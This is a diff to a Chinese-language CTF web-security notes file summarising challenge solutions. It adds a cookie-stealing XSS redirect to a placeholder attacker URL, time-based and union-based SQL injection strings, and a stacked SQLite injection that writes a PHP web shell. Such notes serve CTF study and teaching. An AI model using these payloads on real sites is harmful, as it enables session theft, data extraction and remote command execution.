@@ -2135,7 +2135,7 @@ SELECT * FROM table WHERE column LIKE '%${name}%';
 - [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)可预防sql注入，当题目里出现这些逻辑时就可以放弃考虑sql注入了
 229. [yolo](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/yolo),[wp](https://www.youtube.com/watch?v=AqV3YUtcKGU&t=1123s)
 - CSP `script-src 'nonce-test'`指定只有带着`test`的script标签才能执行js。例如`<script>alert(1)</script>`会被浏览器阻挡，但`<script nonce="test">alert(1)</script>`则能执行（因为其指定的nonce值和服务器设置的csp值一致）
-- CSP `default-src 'self'`阻挡了跨域fetch。如当前domain为`http://a.com`，fetch填写的url就只能是这个域名，`fetch("http://b.com")`会被浏览器阻挡。这种情况下的xss可以借助window.location将数据带出到webhook。`<script>window.location =ATTACKER_URL?x=document.cookie</script>`
+- CSP `default-src 'self'`阻挡了跨域fetch。如当前domain为`http://a.com`，fetch填写的url就只能是这个域名，`fetch("http://b.com")`会被浏览器阻挡。这种情况下的xss可以借助window.location将数据带出到webhook。`<script>window.location =ATTACKER_URL?x=document.cookie</script>`.写成`window['location']`或者`document.location`也是可以的。
 230. [complainer](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/complainer)
 - 利用url重定向（redirect）实现xss。这题的非预期解在于/login路由会重定向：`/login?next=url`。即使能提交给admin bot的url只能是同域的，但是可以更改重定向的url为`javascript: url`，即可让bot执行任意js代码。
 231. [CryptoMarket](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#cryptomarket)
@@ -2166,3 +2166,27 @@ Object.assign(a,b);
     想要进入这个if分支要保证add的id为document中活跃元素的id，或者说add为活跃元素。xss里有两种方法解决：
     - 任意找一个类似`<div>`的tag，设置其id为空。`<div id=""></div>`
     - 找focusable的tag，如`<a>`,上种方法的`<div>`就不行。在url的最后加上anchor或autofocus指向`<a>`标签的id。`http://<a href='url' id='foo'>#foo`
+235. [SecureHashedDb](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#securehasheddb)
+- python bcrypt模块的bcrypt.checkpw函数可检查linux `$2y$`或`$2a$`bcrypt hash format。bcrypt hash可由htpasswd命令得来，或者用python：
+```py
+from passlib.hash import bcrypt
+# htpasswd -bnBC 10 "" password | tr -d ':\n' | sed 's/$2y/$2a/'
+hash = bcrypt.using(rounds=4).hash("data", ident="2y") #rounds 4 faster to generate
+#linux的bcrypt hash即使是hash相同的字符串，每次也会得到不同的结果。因为每次hash都会有不同的随机salt加入hash
+#https://stackoverflow.com/questions/66050881/bcrypt-different-hash-for-same-string
+```
+- mysql注入相关
+  - 利用LIKE语句延时注入（Time Based Sql Injection）
+    - 获取要爆出的数据的长度：`' or (select (select username from user LIMIT 1 OFFSET {offset}) AS ll having ll LIKE BINARY "{pattern}" and sleep(2)) -- abcd`。注意在使用LIKE语句时，永远搭配上binary关键字来区分大小写。
+    - 爆数据：`' or (select (select username from user LIMIT 1 OFFSET {offset}) AS ll having ll LIKE BINARY "{pattern}" and sleep(2)) -- abcd`
+  - 利用union select构造虚拟查询结果伪造身份登录。类似`28. sql注入`提到的内容，当应用限制必须要查出某个特定的用户名或是其他情况导致简单的`'or 1=1--`不能用时，可以利用联合查询构造出制定的用户信息。`' union select 1,(select username from user limit 1 offset 0),pwd--`.
+  - mysql可用16进制表示法（0x开头）作为column里的数据（例如上一条的pwd可换为`0x...`），mysql会自动将其解码
+- php sql的exec函数允许插入多个sql语句（即堆叠注入）。可用以下payload：
+```php
+;ATTACH DATABASE '/tmp/lol.php' AS lol;
+CREATE TABLE lol.pwn (dataz text);
+INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
+//https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database
+```
+在/tmp目录下创建一个连接至lol.php文件的数据库 。然后创建名为pwn的table，并往table里插入php代码。或者说往里面写了个shell。
+- 此题预期解是利用php的反序列化漏洞实现rce。另一种方法在[这里](https://spiky-enquiry-e91.notion.site/Secure-Hashed-DB-25aee784ba96429e8b07586d43ea7016)有提到。因为应用内部调用了file_get_contents，且参数可控。于是可直接控制参数为`php://input`,然后传post参数为想读取的文件即可。另外也有人提到可用[PHP FILTER CHAINS](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)（[工具](https://github.com/synacktiv/php_filter_chains_oracle_exploit)）。不过这种解法会产生非常长的payload，有时候会引发服务器502.
